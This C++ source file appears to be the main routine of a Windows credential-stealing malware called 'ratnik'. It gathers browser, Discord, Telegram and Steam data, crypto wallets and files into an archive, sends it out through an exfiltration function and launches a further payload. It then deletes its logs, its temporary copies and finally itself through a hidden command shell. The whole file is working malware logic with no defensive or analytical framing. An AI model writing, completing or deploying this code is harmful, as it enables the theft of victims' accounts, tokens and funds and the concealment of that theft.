#include "common.h"
#include "collect.h"
#include "exfil.h"
#include "payload.h"
#include "config.h"

static void SelfDelete() {
#if SELF_DELETE
    wchar_t self[MAX_PATH];
    GetModuleFileNameW(nullptr, self, MAX_PATH);
    std::wstring cmd = L"cmd.exe /c ping -n 3 127.0.0.1 >nul & del /f /q \"" + std::wstring(self) + L"\"";
    STARTUPINFOW si{}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    if (CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                       nullptr, nullptr, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
#endif
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
    Log("=== ratnik start ===");

    Zip z;
    CollectSystem(z);
    CollectBrowsers(z);
    CollectFirefox(z);
    CollectDiscord(z);
    CollectTelegram(z);
    CollectSteam(z);
    CollectWallets(z);
    CollectGrabber(z);

    fs::path out = OutDir() / ("ratnik_" + NowStamp() + ".zip");
    if (!z.Save(out)) { Log("zip save failed"); LogClose(); return 0; }
    Log("archive: %s (%zu entries)", ToUtf8(out.wstring()).c_str(), z.Count());

    std::string resp;
    bool sent = Exfil(out, &resp);
    if (sent) {
        Log("sent ok: %s", resp.substr(0, 200).c_str());
        std::error_code ec;
        fs::remove(out, ec);
    } else {
        Log("not sent");
    }

    LaunchPayload();

    {
        std::error_code ec;
        fs::remove_all(OutDir() / L"tmp", ec);   // drop copied sqlite databases
    }

    if (sent) {
        fs::path lp = LogPath();
        LogClose();
        wchar_t keep[8];
        if (GetEnvironmentVariableW(L"RATNIK_KEEP_LOG", keep, 8) == 0) {
            std::error_code ec;
            fs::remove(lp, ec);
        }
        SelfDelete();
    } else {
        Log("=== done ===");
        LogClose();
    }
    return 0;
}
